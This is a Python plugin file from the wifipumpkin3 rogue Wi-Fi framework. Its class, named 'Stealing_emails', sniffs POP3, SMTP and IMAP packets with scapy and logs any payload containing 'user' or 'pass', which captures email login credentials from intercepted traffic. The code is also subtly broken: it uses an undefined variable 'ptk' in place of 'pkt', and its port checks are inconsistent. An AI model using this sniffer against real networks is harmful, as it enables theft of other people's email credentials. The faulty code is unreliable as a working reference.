from scapy.all import *
from wifipumpkin3.plugins.sniffkin3.default import PSniffer

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class Stealing_emails(PSniffer):
    """ capture POP3,IMAP,SMTP """

    _activated = False
    _instance = None
    meta = {
        "Name": "emails",
        "Version": "1.0",
        "Description": "capture emails packets POP3,IMAP,SMTP ",
        "Author": "Pumpkin-Dev",
    }

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if Stealing_emails._instance is None:
            Stealing_emails._instance = Stealing_emails()
        return Stealing_emails._instance

    def filterPackets(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if self.dport == 110 or self.sport == 25 or self.dport == 143:
                if ptk[TCP].payload:
                    email_pkt = str(ptk[TCP].payload)
                    if "user" in email_pkt.lower() or "pass" in email_pkt.lower():
                        self.logging.info("[*] Server {}".format(pkt[IP].dst))
                        self.logging.info("[*] {}".format(pkt[TCP].payload))
